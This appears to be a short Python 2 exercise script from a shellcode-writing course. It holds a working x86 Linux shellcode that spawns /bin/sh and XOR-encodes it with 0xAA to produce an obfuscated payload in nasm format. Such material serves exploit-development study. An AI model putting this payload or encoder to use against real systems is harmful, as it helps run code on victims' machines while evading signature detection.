#!/usr/bin/python2

#Author:		Paolo Stivanin <https://github.com/polslinux>
#Tested on:		Gentoo x86/x86-64, Ubuntu 14.04 x86/amd64
#SLAE ID:		526

shellcode = ("\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80")

encoded = ""
i=1

print 'Lenght of shellcode: %d' % len(bytearray(shellcode)) + ', encoded shellcode (nasm format):'
for x in bytearray(shellcode):
	y = x^0xAA
	
	encoded += '0x'
	if i < 25:
		encoded += '%02x,' % y
	else:
		encoded += '%02x' % y
	i += 1
	
print encoded


